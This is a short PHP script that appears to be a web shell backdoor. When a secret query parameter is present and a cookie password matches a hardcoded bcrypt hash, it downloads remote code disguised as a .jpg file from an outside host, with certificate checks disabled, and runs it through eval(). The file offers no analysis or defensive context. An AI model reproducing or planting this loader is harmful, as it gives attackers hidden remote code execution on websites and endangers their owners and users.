<?php

function fetchContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);

    $content = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
	
    return ($httpCode === 200) ? $content : false;
}

if (isset($_GET['gungunqwe'])) {
    $url = 'https://examples2.pages.dev/1.jpg';
    $content = fetchContent($url);
    $p = '$2a$12$.te0/UQxvoLTVGI7f3hKueXhzcyvqyHrXjqB3duEK6N0hxA2MjD8O';

    if ($content !== false && password_verify($_COOKIE['p']??'',$p)) {
        if (strpos($content, 'session_start()') !== false) {
            $content = preg_replace('/session_start\s*\(\s*\)\s*;?/i', '', $content);
        }
        eval('?>' . $content);
    } else {
        echo "Gagal mengambil konten dari URL.";
    }
    exit();
}
